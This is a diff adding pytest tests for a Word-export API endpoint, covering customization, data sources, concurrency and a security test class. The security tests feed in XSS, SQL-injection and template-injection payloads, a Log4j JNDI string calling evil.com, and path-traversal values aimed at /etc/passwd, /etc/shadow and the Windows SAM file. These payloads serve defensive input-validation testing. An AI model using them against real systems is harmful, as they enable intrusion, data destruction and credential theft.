@@ -706,3 +706,358 @@ class TestWordSpecificFeatures:
             status.HTTP_422_UNPROCESSABLE_ENTITY,
             status.HTTP_500_INTERNAL_SERVER_ERROR
         ]
+
+
+class TestDocumentCustomization:
+    """Test cases for document customization features."""
+    
+    def test_font_customization_request(self, client: TestClient, mock_auth):
+        """Test request with font customization."""
+        request_with_fonts = {
+            "job_name": "Custom Font Document",
+            "document_config": {
+                "template": "professional",
+                "metadata": {"title": "Custom Font Document"},
+                "layout": {"sections": []},
+                "font_family": "Arial",
+                "font_size": 12,
+                "color_scheme": "green",
+                "charts": [],
+                "tables": []
+            },
+            "data_source": {"static_source": {"data": {}}},
+            "output_format": "docx"
+        }
+        
+        response = client.post("/api/v1/word-exports/generate", json=request_with_fonts)
+        
+        if response.status_code == status.HTTP_401_UNAUTHORIZED:
+            pytest.skip("Authentication required - endpoint properly protected")
+        
+        # Should handle font customization requests
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_422_UNPROCESSABLE_ENTITY,
+            status.HTTP_500_INTERNAL_SERVER_ERROR
+        ]
+    
+    def test_color_scheme_validation(self, client: TestClient, mock_auth):
+        """Test color scheme validation."""
+        valid_schemes = ["blue", "green", "red", "purple", "orange"]
+        invalid_schemes = ["invalid", "custom", ""]
+        
+        for color_scheme in valid_schemes + invalid_schemes:
+            request_data = {
+                "job_name": "Color Scheme Test",
+                "document_config": {
+                    "template": "professional",
+                    "metadata": {"title": "Test"},
+                    "layout": {"sections": []},
+                    "color_scheme": color_scheme,
+                    "charts": [],
+                    "tables": []
+                },
+                "data_source": {"static_source": {"data": {}}},
+                "output_format": "docx"
+            }
+            
+            response = client.post("/api/v1/word-exports/generate", json=request_data)
+            
+            if response.status_code == status.HTTP_401_UNAUTHORIZED:
+                pytest.skip("Authentication required - endpoint properly protected")
+            
+            if color_scheme in valid_schemes:
+                assert response.status_code in [status.HTTP_200_OK, status.HTTP_500_INTERNAL_SERVER_ERROR]
+            else:
+                assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
+
+
+class TestDataSourceValidation:
+    """Test cases for data source validation."""
+    
+    def test_static_data_source(self, client: TestClient, mock_auth):
+        """Test static data source validation."""
+        request_data = {
+            "job_name": "Static Data Test",
+            "document_config": {
+                "template": "professional",
+                "metadata": {"title": "Test"},
+                "layout": {"sections": []},
+                "charts": [],
+                "tables": []
+            },
+            "data_source": {
+                "static_source": {
+                    "data": {
+                        "charts": [{"name": "Test Chart", "values": [1, 2, 3]}],
+                        "tables": [{"columns": ["A", "B"], "rows": [[1, 2], [3, 4]]}]
+                    }
+                }
+            },
+            "output_format": "docx"
+        }
+        
+        response = client.post("/api/v1/word-exports/generate", json=request_data)
+        
+        if response.status_code == status.HTTP_401_UNAUTHORIZED:
+            pytest.skip("Authentication required - endpoint properly protected")
+        
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_500_INTERNAL_SERVER_ERROR
+        ]
+    
+    def test_query_data_source(self, client: TestClient, mock_auth):
+        """Test query data source validation."""
+        request_data = {
+            "job_name": "Query Data Test",
+            "document_config": {
+                "template": "professional",
+                "metadata": {"title": "Test"},
+                "layout": {"sections": []},
+                "charts": [],
+                "tables": []
+            },
+            "data_source": {
+                "query_source": {
+                    "query": "SELECT * FROM test_table",
+                    "parameters": {"start_date": "2024-01-01"},
+                    "connection_id": "db-conn-1"
+                }
+            },
+            "output_format": "docx"
+        }
+        
+        response = client.post("/api/v1/word-exports/generate", json=request_data)
+        
+        if response.status_code == status.HTTP_401_UNAUTHORIZED:
+            pytest.skip("Authentication required - endpoint properly protected")
+        
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_422_UNPROCESSABLE_ENTITY,
+            status.HTTP_500_INTERNAL_SERVER_ERROR
+        ]
+    
+    def test_file_data_source(self, client: TestClient, mock_auth):
+        """Test file data source validation."""
+        request_data = {
+            "job_name": "File Data Test",
+            "document_config": {
+                "template": "professional",
+                "metadata": {"title": "Test"},
+                "layout": {"sections": []},
+                "charts": [],
+                "tables": []
+            },
+            "data_source": {
+                "file_source": {
+                    "file_path": "/tmp/test_data.csv",
+                    "file_format": "csv",
+                    "has_header": True,
+                    "delimiter": ",",
+                    "encoding": "utf-8"
+                }
+            },
+            "output_format": "docx"
+        }
+        
+        response = client.post("/api/v1/word-exports/generate", json=request_data)
+        
+        if response.status_code == status.HTTP_401_UNAUTHORIZED:
+            pytest.skip("Authentication required - endpoint properly protected")
+        
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_422_UNPROCESSABLE_ENTITY,
+            status.HTTP_500_INTERNAL_SERVER_ERROR
+        ]
+
+
+class TestConcurrencyAndPerformance:
+    """Test cases for concurrency and performance."""
+    
+    def test_concurrent_job_creation(self, client: TestClient, mock_auth):
+        """Test creating multiple jobs concurrently."""
+        import threading
+        import time
+        
+        results = []
+        
+        def create_job(job_index):
+            request_data = {
+                "job_name": f"Concurrent Job {job_index}",
+                "document_config": {
+                    "template": "professional",
+                    "metadata": {"title": f"Document {job_index}"},
+                    "layout": {"sections": []},
+                    "charts": [],
+                    "tables": []
+                },
+                "data_source": {"static_source": {"data": {}}},
+                "output_format": "docx"
+            }
+            
+            start_time = time.time()
+            response = client.post("/api/v1/word-exports/generate", json=request_data)
+            end_time = time.time()
+            
+            results.append({
+                "job_index": job_index,
+                "status_code": response.status_code,
+                "response_time": end_time - start_time
+            })
+        
+        # Create multiple threads
+        threads = [threading.Thread(target=create_job, args=(i,)) for i in range(5)]
+        
+        # Start all threads
+        for thread in threads:
+            thread.start()
+        
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
+        
+        # Verify results
+        assert len(results) == 5
+        
+        for result in results:
+            if result["status_code"] != status.HTTP_401_UNAUTHORIZED:
+                # Should handle concurrent requests without major issues
+                assert result["status_code"] in [
+                    status.HTTP_200_OK,
+                    status.HTTP_429_TOO_MANY_REQUESTS,
+                    status.HTTP_500_INTERNAL_SERVER_ERROR
+                ]
+                # Response time should be reasonable
+                assert result["response_time"] < 10.0
+    
+    def test_large_document_generation(self, client: TestClient, mock_auth):
+        """Test generating large documents."""
+        large_sections = []
+        for i in range(50):  # Create many sections
+            large_sections.append({
+                "id": f"section-{i}",
+                "title": f"Section {i}",
+                "content_type": "text",
+                "text_content": f"This is content for section {i}. " * 20,
+                "order": i
+            })
+        
+        request_data = {
+            "job_name": "Large Document Test",
+            "document_config": {
+                "template": "professional",
+                "metadata": {"title": "Large Document"},
+                "layout": {"sections": large_sections},
+                "charts": [],
+                "tables": []
+            },
+            "data_source": {"static_source": {"data": {}}},
+            "output_format": "docx"
+        }
+        
+        response = client.post("/api/v1/word-exports/generate", json=request_data)
+        
+        if response.status_code == status.HTTP_401_UNAUTHORIZED:
+            pytest.skip("Authentication required - endpoint properly protected")
+        
+        # Should handle large documents
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_422_UNPROCESSABLE_ENTITY,
+            status.HTTP_500_INTERNAL_SERVER_ERROR
+        ]
+
+
+class TestSecurityFeatures:
+    """Test cases for security features."""
+    
+    def test_input_sanitization(self, client: TestClient, mock_auth):
+        """Test input sanitization for XSS and injection attacks."""
+        malicious_inputs = [
+            "<script>alert('xss')</script>",
+            "'; DROP TABLE jobs; --",
+            "<img src=x onerror=alert('xss')>",
+            "{{7*7}}",  # Template injection
+            "${jndi:ldap://evil.com}",  # Log4j injection
+        ]
+        
+        for malicious_input in malicious_inputs:
+            request_data = {
+                "job_name": malicious_input,
+                "document_config": {
+                    "template": "professional",
+                    "metadata": {"title": malicious_input},
+                    "layout": {"sections": []},
+                    "charts": [],
+                    "tables": []
+                },
+                "data_source": {"static_source": {"data": {}}},
+                "output_format": "docx"
+            }
+            
+            response = client.post("/api/v1/word-exports/generate", json=request_data)
+            
+            if response.status_code == status.HTTP_401_UNAUTHORIZED:
+                pytest.skip("Authentication required - endpoint properly protected")
+            
+            # Should sanitize malicious input or reject request
+            assert response.status_code in [
+                status.HTTP_200_OK,
+                status.HTTP_400_BAD_REQUEST,
+                status.HTTP_422_UNPROCESSABLE_ENTITY,
+                status.HTTP_500_INTERNAL_SERVER_ERROR
+            ]
+            
+            # Response should not echo back malicious content
+            if response.status_code == status.HTTP_200_OK:
+                response_text = response.text
+                assert "<script>" not in response_text
+                assert "onerror=" not in response_text
+    
+    def test_file_path_traversal_protection(self, client: TestClient, mock_auth):
+        """Test protection against path traversal attacks."""
+        malicious_paths = [
+            "../../etc/passwd",
+            "../../../windows/system32/config/sam",
+            "....//....//....//etc/passwd",
+            "/etc/shadow",
+            "C:\\Windows\\System32\\config\\SAM",
+        ]
+        
+        for malicious_path in malicious_paths:
+            request_data = {
+                "job_name": "Path Traversal Test",
+                "document_config": {
+                    "template": "professional",
+                    "metadata": {"title": "Test"},
+                    "layout": {"sections": []},
+                    "charts": [],
+                    "tables": []
+                },
+                "data_source": {
+                    "file_source": {
+                        "file_path": malicious_path,
+                        "file_format": "csv"
+                    }
+                },
+                "output_format": "docx"
+            }
+            
+            response = client.post("/api/v1/word-exports/generate", json=request_data)
+            
+            if response.status_code == status.HTTP_401_UNAUTHORIZED:
+                pytest.skip("Authentication required - endpoint properly protected")
+            
+            # Should reject dangerous file paths
+            assert response.status_code in [
+                status.HTTP_400_BAD_REQUEST,
+                status.HTTP_422_UNPROCESSABLE_ENTITY,
+                status.HTTP_500_INTERNAL_SERVER_ERROR
+            ]
+
+
+if __name__ == "__main__":
+    pytest.main([__file__, "-v", "--tb=short"])
